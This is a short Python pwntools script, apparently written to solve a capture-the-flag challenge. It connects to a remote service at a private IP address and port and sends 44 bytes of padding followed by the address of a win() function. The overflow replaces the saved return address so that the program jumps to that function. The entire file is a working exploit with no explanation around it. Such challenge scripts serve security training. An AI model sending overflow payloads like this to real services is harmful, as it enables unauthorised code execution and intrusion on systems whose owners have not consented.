from pwn import *

host = "10.213.0.102"
port = 41465
p = remote(host, port)

# Address of win() function
win_addr = p32(0x080491b6)

# Try different offsets - the buffer is 36 bytes
# We need to reach the return address on the stack
payload = b"A" * 44 + win_addr  # Increase padding

# Receive the prompt
p.recvuntil(b"Insert your message to the world\n")
p.sendline(payload)

# Get the response
try:
    response = p.recvall(timeout=2)
    print(response)
except:
    response = p.recv()
    print(response)

p.close()